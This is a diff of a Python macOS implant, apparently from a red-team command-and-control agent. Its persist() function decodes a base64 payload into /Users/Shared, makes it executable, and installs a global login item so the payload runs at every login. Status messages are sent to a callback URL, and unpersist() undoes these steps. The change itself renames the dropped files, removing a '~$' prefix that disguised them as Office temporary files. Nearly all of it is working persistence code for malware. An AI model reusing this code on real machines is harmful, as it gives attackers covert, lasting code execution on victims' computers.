@@ -350,21 +350,21 @@ def checksecurity():
 #################################
 def persist(data):
     try:
-        lfile = open('/Users/Shared/~$IT-Provision.command', 'w')
+        lfile = open('/Users/Shared/IT-Provision.command', 'w')
         lfile.write('#!/usr/bin/python\n\n')
         lfile.write('import subprocess\n\n')
-        lfile.write("subprocess.Popen('python /Users/Shared/\"~\$IT-Provision.py\" &',shell=True)")
+        lfile.write("subprocess.Popen('python /Users/Shared/IT-Provision.py &',shell=True)")
         lfile.close()
-        st = os.stat("/Users/Shared/~$IT-Provision.command")
-        os.chmod("/Users/Shared/~$IT-Provision.command",st.st_mode | 0o111)
+        st = os.stat("/Users/Shared/IT-Provision.command")
+        os.chmod("/Users/Shared/IT-Provision.command",st.st_mode | 0o111)
         
-        ofile = open('/Users/Shared/~$IT-Provision.py', 'wb')
+        ofile = open('/Users/Shared/IT-Provision.py', 'wb')
         datal = base64.b64decode(data)
         ofile.write(datal)
 
         ofile.close()
-        st = os.stat("/Users/Shared/~$IT-Provision.py")
-        os.chmod("/Users/Shared/~$IT-Provision.py",st.st_mode | 0o111)
+        st = os.stat("/Users/Shared/IT-Provision.py")
+        os.chmod("/Users/Shared/IT-Provision.py",st.st_mode | 0o111)
         
         SFL_bundle = NSBundle.bundleWithIdentifier_('com.apple.coreservices.SharedFileList')
         functions  = [('LSSharedFileListCreate',              '^{OpaqueLSSharedFileListRef=}^{__CFAllocator=}^{__CFString=}@'),
@@ -381,14 +381,14 @@ def persist(data):
         objc.loadBundleFunctions(SFL_bundle, globals(), functions)
 
         auth = SFAuthorization.authorization().authorizationRef()
-        ref = SCPreferencesCreateWithAuthorization(None, "/Users/Shared/~$IT-Provision.command", "/Users/Shared/~$IT-Provision.command", auth)
+        ref = SCPreferencesCreateWithAuthorization(None, "/Users/Shared/IT-Provision.command", "/Users/Shared/IT-Provision.command", auth)
 
         
-        temp = CoreFoundation.CFURLCreateFromFileSystemRepresentation(kCFAllocatorDefault,'/Users/Shared/~$IT-Provision.command',39,False)
+        temp = CoreFoundation.CFURLCreateFromFileSystemRepresentation(kCFAllocatorDefault,'/Users/Shared/IT-Provision.command',39,False)
         items = LSSharedFileListCreate(kCFAllocatorDefault, kLSSharedFileListGlobalLoginItems, None)
 
         myauth = LSSharedFileListSetAuthorization(items,auth)
-        name = CFStringCreateWithCString(None,'/Users/Shared/~$IT-Provision.command',kCFStringEncodingASCII)
+        name = CFStringCreateWithCString(None,'/Users/Shared/IT-Provision.command',kCFStringEncodingASCII)
         itemRef = LSSharedFileListInsertItemURL(items,kLSSharedFileListItemLast,name,None,temp,None,None)
         
         sendstring = "[+] Login Item persistence successful"
@@ -422,9 +422,9 @@ def unpersist():
         objc.loadBundleFunctions(SFL_bundle, globals(), functions)
 
         auth = SFAuthorization.authorization().authorizationRef()
-        ref = SCPreferencesCreateWithAuthorization(None, "/Users/Shared/~$IT-Provision.command", "/Users/Shared/~$IT-Provision.command", auth)
+        ref = SCPreferencesCreateWithAuthorization(None, "/Users/Shared/IT-Provision.command", "/Users/Shared/IT-Provision.command", auth)
 
-        temp = CoreFoundation.CFURLCreateFromFileSystemRepresentation(kCFAllocatorDefault,'/Users/Shared/~$IT-Provision.command',39,False)
+        temp = CoreFoundation.CFURLCreateFromFileSystemRepresentation(kCFAllocatorDefault,'/Users/Shared/IT-Provision.command',39,False)
         
         
         list_ref = LSSharedFileListCreate(kCFAllocatorDefault, kLSSharedFileListGlobalLoginItems, None)
@@ -434,14 +434,14 @@ def unpersist():
         for items in x[1]:
             err, a_CFURL, a_FSRef = LSSharedFileListItemResolve(items, kLSSharedFileListNoUserInteraction + kLSSharedFileListNoUserInteraction, None, None)
             url_list.append(a_CFURL)
-        path = NSURL.fileURLWithPath_('/Users/Shared/~$IT-Provision.command')
+        path = NSURL.fileURLWithPath_('/Users/Shared/IT-Provision.command')
         if path in url_list:
             i = url_list.index(path)
             target = login_items[i]
             result = LSSharedFileListItemRemove(list_ref, target)
 
-        os.remove('/Users/Shared/~$IT-Provision.command')
-        os.remove('/Users/Shared/~$IT-Provision.py')
+        os.remove('/Users/Shared/IT-Provision.command')
+        os.remove('/Users/Shared/IT-Provision.py')
         sendstring = "[+] Login Item persistence and files removed"
         a = {'content':sendstring}
         b = 'https://127.0.0.1/validatiion/profile/19'
